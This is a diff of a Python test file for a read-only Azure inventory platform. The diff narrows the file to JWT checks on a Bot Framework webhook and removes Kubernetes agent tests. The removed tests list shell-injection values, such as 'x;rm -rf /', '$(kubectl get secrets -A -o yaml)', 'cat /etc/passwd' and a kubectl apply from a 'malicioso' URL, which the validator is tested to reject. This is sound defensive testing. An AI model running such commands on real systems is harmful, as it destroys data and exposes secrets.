@@ -1,19 +1,14 @@
 """
-Pruebas de las dos puertas de entrada que no exige token de usuario.
+Pruebas de la puerta de entrada que no exige token de usuario.
 
 La plataforma es de solo lectura sobre Azure y expone el inventario completo de
-la organizacion. Dos caminos escapan al middleware de Entra ID y son los que se
-verifican aqui:
+la organizacion. `/api/teams/webhook` escapa al middleware de Entra ID porque lo
+invoca el servicio de Bot Framework: su autenticacion es el JWT que Bot
+Framework firma en cada peticion; sin validarlo, cualquiera que conozca la URL
+obtiene el inventario y hace escribir al bot en el canal de Teams.
 
-1. `/api/teams/webhook`, que no puede pedir token de usuario porque lo invoca el
-   servicio de Bot Framework. Su autenticacion es el JWT que Bot Framework firma
-   en cada peticion; sin validarlo, cualquiera que conozca la URL obtiene el
-   inventario y hace escribir al bot en el canal de Teams.
-
-2. Los endpoints del agente de Kubernetes, que arman comandos `kubectl` y los
-   ejecutan con AKS Run Command. Es el unico punto del sistema capaz de escribir
-   en infraestructura, asi que los identificadores que llegan del cliente tienen
-   que ser nombres de Kubernetes y nada mas.
+(El agente de Kubernetes que ejecutaba `kubectl` por AKS Run Command se retiro:
+los clusteres ahora envian su foto con un agente de solo lectura.)
 
 Se usan dobles y tokens fabricados: ninguna prueba llama a Azure ni necesita
 credenciales. Ejecutar con:
@@ -35,7 +30,6 @@ os.environ.setdefault("BOT_AUTH_ENABLED", "true")
 import jwt  # noqa: E402
 
 from app.services import bot_auth  # noqa: E402
-from app.services.k8s_service import K8sInputError, K8sService, _validar_nombre  # noqa: E402
 
 APP_ID = os.environ["MICROSOFT_APP_ID"]
 FUTURO = 9999999999
@@ -117,74 +111,6 @@ def test_service_url_debe_coincidir():
         assert "serviceUrl" in str(exc)
         return
     raise AssertionError("un serviceUrl distinto al del token no puede aceptarse")
-
-
-# ---------------------------------------------------------------------------
-# Agente de Kubernetes
-# ---------------------------------------------------------------------------
-
-INYECCIONES = [
-    "mipod;kubectl delete ns produccion",
-    "default && kubectl drain node-1",
-    "$(kubectl get secrets -A -o yaml)",
-    "`id`",
-    "ns | cat /etc/passwd",
-    "pod\nkubectl apply -f http://malicioso",
-    "../../etc/passwd",
-    "pod > /tmp/salida",
-]
-
-
-def test_identificadores_validos_se_aceptan():
-    for valido in ["kube-system", "api-gateway-7d9f", "mi.servicio", "a1"]:
-        assert _validar_nombre(valido, "pod") == valido
-
-
-def test_inyecciones_se_rechazan():
-    for mal in INYECCIONES:
-        try:
-            _validar_nombre(mal, "pod")
-        except K8sInputError:
-            continue
-        raise AssertionError(f"identificador peligroso aceptado: {mal!r}")
-
-
-def test_logs_de_pod_validan_sus_tres_identificadores():
-    servicio = K8sService.__new__(K8sService)  # sin tocar Azure
-    servicio.azure = None
-    servicio.aks_client = None
-    for campo, kwargs in [
-        ("pod", {"pod_name": "x;rm -rf /", "namespace": "default"}),
-        ("namespace", {"pod_name": "api", "namespace": "def;ault"}),
-        ("container", {"pod_name": "api", "namespace": "default", "container": "c;x"}),
-    ]:
-        try:
-            servicio.get_pod_logs(**kwargs)
-        except K8sInputError as exc:
-            assert campo in str(exc)
-            continue
-        raise AssertionError(f"get_pod_logs no valido el campo {campo}")
-
-
-def test_ultima_barrera_antes_de_ejecutar():
-    """
-    Defensa en profundidad: aunque un valor externo se colara sin validar, el
-    comando no debe salir hacia Run Command si trae metacaracteres de shell.
-    """
-    try:
-        K8sService._assert_sin_metacaracteres("get pods -n default; kubectl delete ns x")
-    except K8sInputError:
-        return
-    raise AssertionError("un comando con metacaracteres no puede ejecutarse")
-
-
-def test_comandos_legitimos_pasan_la_barrera():
-    for comando in [
-        "get pods -A -o json",
-        "get nodes -o json",
-        "logs api-gateway -n kube-system --tail=100 --timestamps=true",
-    ]:
-        K8sService._assert_sin_metacaracteres(comando)
 
 
 def main() -> int:
